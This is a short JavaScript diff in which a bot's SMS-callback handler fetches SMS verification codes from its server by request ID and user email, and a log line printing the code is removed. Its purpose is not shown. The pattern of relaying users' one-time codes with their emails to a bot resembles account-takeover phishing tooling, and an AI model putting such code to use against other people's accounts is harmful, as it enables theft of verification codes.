@@ -636,12 +636,11 @@ if (bot2) {
       let displayEmail = email;  // ✅ What to show in acceptance message
 
       // ✅ For SMS callbacks, get SMS code from server
-      if (action.startsWith("sms_") && identifier && identifier.includes("sms_code_")) {
+      if (action.startsWith("sms_")) {
         try {
-          const response = await fetch(`${APP_URL}/get-sms-code?requestId=${encodeURIComponent(identifier)}`);
+          const response = await fetch(`${APP_URL}/get-sms-code?requestId=${encodeURIComponent(identifier)}&email=${encodeURIComponent(email)}`);
           const data = await response.json();
           smsCode = data.smsCode || identifier;
-          console.log(`📝 SMS callback: requestId ${identifier} → code ${smsCode}`);
         } catch (err) {
           console.error("Error fetching SMS code:", err);
           smsCode = identifier;
